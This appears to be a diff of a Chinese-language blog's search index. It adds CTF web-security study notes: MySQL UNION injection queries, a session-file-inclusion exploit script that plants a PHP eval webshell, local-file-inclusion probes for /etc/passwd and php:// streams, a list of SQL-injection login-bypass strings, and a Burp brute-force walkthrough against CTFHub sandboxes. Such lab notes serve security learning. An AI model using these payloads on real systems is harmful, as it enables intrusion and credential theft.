@@ -1,18 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Java实战</title>
-    <url>/2024/02/07/Java%E5%AE%9E%E6%88%98/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>Languages</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-        <tag>项目实战</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2024-计划书单</title>
     <url>/2024/01/23/2024-%E8%AE%A1%E5%88%92%E4%B9%A6%E5%8D%95/</url>
     <content><![CDATA[<h2 id="预祝新的一年你会有更多的属于自己的时刻！❀❀❀"><a href="#预祝新的一年你会有更多的属于自己的时刻！❀❀❀" class="headerlink" title="预祝新的一年你会有更多的属于自己的时刻！❀❀❀"></a>预祝新的一年你会有更多的属于自己的时刻！❀❀❀</h2><h3 id="《家山》-王跃文"><a href="#《家山》-王跃文" class="headerlink" title="《家山》-王跃文"></a>《家山》-王跃文</h3><ul>
@@ -86,6 +74,117 @@ over</p>
         <tag>书单</tag>
         <tag>Love</tag>
         <tag>Book</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2024/03/11/CTF_WEB/</url>
+    <content><![CDATA[<h1 id="CTF-WEB"><a href="#CTF-WEB" class="headerlink" title="CTF_WEB"></a>CTF_WEB</h1><h2 id="SQL注入："><a href="#SQL注入：" class="headerlink" title="SQL注入："></a>SQL注入：</h2><p>1、数据库为mysql的爆库、爆表、爆字段、爆值的语句：</p>
+<p><strong>爆库：</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,database();#查看此处有多字段</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>爆表：</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database(); #   </span><br></pre></td></tr></table></figure></div>
+
+<p><strong>爆字段：</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&quot;表名&quot;; # </span><br></pre></td></tr></table></figure></div>
+
+<p><strong>爆值：</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,字段 from 表名; #   </span><br></pre></td></tr></table></figure></div>
+
+<h2 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h2><p>实战例子：</p>
+<p>CTFshow&#x2F; easy_include</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[a-z]+/&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;file://&quot;</span>.<span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>代码解释：</p>
+<blockquote>
+<p>观察cookie，发现自动开启了session，直接session文件包含</p>
+<p>如果能获取PHPSESSID<br>    “请求 Cookie”: {<br>        <strong>“PHPSESSID”: “a5c4fd8ef729d435160c08a37d20ed7a”</strong><br>    }</p>
+</blockquote>
+<p>EXP:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># Author:ctfshow-h1xa</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;localhost/tmp/sess_ctfshow&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>:<span class="string">&#x27;system(&quot;cat /flag_is_here.txt&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,data=data,files=file,cookies=cookies)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h1 id="php文件漏洞"><a href="#php文件漏洞" class="headerlink" title="php文件漏洞"></a>php文件漏洞</h1><p><strong>get方式查看文件漏洞</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=/etc/passwd  </span><br><span class="line">#GET /?url=/etc/passwd HTTP/1.1</span><br><span class="line">#若出现大串文件，则有文件漏洞</span><br><span class="line">#($_GET[&#x27;url&#x27;])极有可能含有文件漏洞</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>使用php协议</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=php://input</span><br><span class="line">#GET /?url=php://input HTTP/1.1</span><br><span class="line">#可以访问请求的原始数据的只读流;</span><br><span class="line">#enctype=&quot;multipart/form-data&quot;的时候php://input是无效的;</span><br><span class="line"></span><br><span class="line">?url=php://output</span><br><span class="line">#GET /?url=php://output HTTP/1.1</span><br><span class="line">#一个只写的数据流，允许以print和echo一样的方式写入到输出缓冲区</span><br><span class="line"></span><br><span class="line">?url=php://fd</span><br><span class="line">#GET /?url=php://fd HTTP/1.1</span><br><span class="line">#允许直接访问指定的文件描述符。例如：php://fd/3引用了文件描述符3.</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>查看PHP下的文夹使用ls</strong></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><strong>查看php下的文件夹中的文件内容cat</strong></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat 文件夹名称&quot;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><strong>查看文件日志的文件夹</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h1 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h1><blockquote>
+<p> ’ or 1&#x3D;1 #</p>
+<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p> 账号： admin<br> 密码：admin</p>
+<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p> 账号：admin<br> 密码：admin888</p>
+<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p> 账号：admin</p>
+<p> 密码：域名名</p>
+<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<h2 id="asp-aspx万能密码"><a href="#asp-aspx万能密码" class="headerlink" title="asp aspx万能密码"></a>asp aspx万能密码</h2><p> “or “a”&#x3D;”a<br>  ‘)or(‘a’&#x3D;’a<br> or 1&#x3D;1-<br> ‘or 1&#x3D;1-<br> a’or’1&#x3D;1-<br> “or 1&#x3D;1-<br> ‘or’a’&#x3D;’a<br> “or”&#x3D;”a’&#x3D;’a<br> ‘or’&#x3D;’’<br> ‘or’&#x3D;’or’<br> 1 or ‘1’&#x3D;’1’&#x3D;1<br> 1 or ‘1’&#x3D;’1’or 1&#x3D;1<br> ‘OR 1&#x3D;1%00<br> “or 1&#x3D;1%00<br> ‘xor ## PHP万能密码</p>
+<p> ‘or’&#x3D;’or’</p>
+<p> ‘or 1&#x3D;1 &#x2F;* 字符型 GPC是否开都可以使用*&#x2F;</p>
+<p> User: something<br> Pass: ’ OR ‘1’&#x3D;’1</p>
+<p> jsp 万能密码</p>
+<p> 1’or’1’&#x3D;’1</p>
+<p> admin’ OR 1&#x3D;1&#x2F;*</p>
+<p> 用户名：admin 系统存在这个用户的时候 才用得上<br> 密码：1’or’1’&#x3D;’1</p>
+</blockquote>
+<h1 id="万能账号"><a href="#万能账号" class="headerlink" title="万能账号"></a>万能账号</h1><blockquote>
+<p>a’ or true #</p>
+<p>账号：…admin’ or ‘a’&#x3D;’a 密码随便填</p>
+</blockquote>
+<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><blockquote>
+<hr>
+<p>&#x2F;or|-||&#x2F;|*|&lt;|&gt;|!|x|hex|(|)|+|select&#x2F;i</p>
+<blockquote>
+<ol>
+<li><code>/</code>：这个符号表示正则表达式模式的开始和结束。</li>
+<li><code>|</code>：这个符号代表“或”条件，意味着可以匹配两边的任何模式。</li>
+<li>\-, \, /, \*, &lt;, &gt;, !, x, hex, (, ), +, select&#96;: 这些是正则表达式将尝试匹配的实际模式。这些模式中的一些代表特定字符，而其他一些代表某些条件。<ul>
+<li><code>-</code>：匹配破折号字符。</li>
+<li><code>\\</code>：匹配反斜杠字符。</li>
+<li><code>\/</code>：匹配正斜杠字符。</li>
+<li><code>\\*</code>：匹配星号字符。</li>
+<li><code>\&lt;</code>：匹配单词的开头。</li>
+<li><code>\&gt;</code>：匹配单词的结尾。</li>
+<li><code>\!</code>：匹配感叹号字符。</li>
+<li><code>x</code>：匹配字母 ‘x’。</li>
+<li><code>hex</code>：匹配字符串 ‘hex’。</li>
+<li><code>\(</code>：匹配左括号。</li>
+<li><code>\)</code>：匹配右括号。</li>
+<li><code>\+</code>：匹配加号。</li>
+<li><code>select</code>：匹配字符串 ‘select’。</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+<p>可以使用管道符||绕过和使用取反符号~~绕过</p>
+</blockquote>
+]]></content>
+  </entry>
+  <entry>
+    <title>Java实战</title>
+    <url>/2024/02/07/Java%E5%AE%9E%E6%88%98/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>Languages</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>项目实战</tag>
       </tags>
   </entry>
   <entry>
@@ -1233,6 +1332,19 @@ over</p>
 <p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_3.png" alt="CTFHUB_WEB_3_3"></p>
 <p>直接用</p>
 <p><a class="link" href="http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/flag_3210627471.txt%E5%BE%97%E5%88%B0flag">http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/flag_3210627471.txt得到flag <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="Web-弱口令"><a href="#Web-弱口令" class="headerlink" title="Web_弱口令"></a>Web_弱口令</h2><blockquote>
+<p><strong>弱口令</strong></p>
+<p>通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。 </p>
+</blockquote>
+<p>使用<code>BurpSuite</code>中<code>Intruder</code>模块 ，即暴力破解模块(或在fuzz中使用)</p>
+<p>开启burp代理</p>
+<p>登录信息随便填，抓到request请求如下</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 35</span><br><span class="line">Origin: http://challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">name=admin&amp;password=ctfhub&amp;referer=</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_2.png" alt="CTFHUB_WEB_4_2"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_3.png" alt="CTFHUB_WEB_4_3"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_4.png" alt="CTFHUB_WEB_4_4"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_5.png" alt="CTFHUB_WEB_4_5"></p>
 ]]></content>
       <tags>
         <tag>笔记</tag>
